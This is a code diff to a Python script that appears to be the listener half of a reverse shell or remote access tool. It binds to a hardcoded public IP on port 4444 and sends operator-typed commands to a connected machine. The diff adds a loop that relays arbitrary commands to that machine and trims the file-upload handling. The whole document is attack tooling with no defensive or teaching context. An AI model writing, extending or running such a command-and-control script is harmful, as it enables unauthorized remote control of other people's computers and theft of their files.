@@ -2,12 +2,12 @@ import socket
 import codecs
 import os
 import sys
+import time
 s = socket.socket()
 s.bind(("64.227.13.249",4444))
 s.listen(5)
-s.settimeout(2)
 c,a = s.accept()
-c.settimeout(6)
+c.settimeout(5)
 point = 1
 store=b''
 store_data=b''
@@ -17,6 +17,15 @@ store =codecs.decode(c.recv(100))
 while True:
  shell = input("shell"+">>> ")          # taking command
  move_data = shell.split()
+ if shell=="time_to_execute":
+  c.send(codecs.encode(shell))
+  while True:
+   command = input("cmd>>>")
+   if command =="exit":
+    c.send(codecs.encode("exit"))
+    break
+   else:
+    c.send(codecs.encode(command))
  if shell=="ls":   #first command
   c.send(codecs.encode(shell))
   store_data=b''
@@ -76,19 +85,8 @@ while True:
  except:
   pass
 
- try:
-  if move_data[0]=="upload" and move_data[1]!='':
+ if move_data[0]=="upload" and move_data[1]!='':
    c.send(codecs.encode(move_data[0]+" "+move_data[1]))
-   f= open(p[1],"rb")	
-   print("file readed")
-   data = f.read(1024)
-   while data:
-    c.send(data)
-    data = f.read(1024) 	 
-   print("file sent")	  
-   f.close()	
- except:
-  pass
-  
+
  if shell == "close":
   c.close()
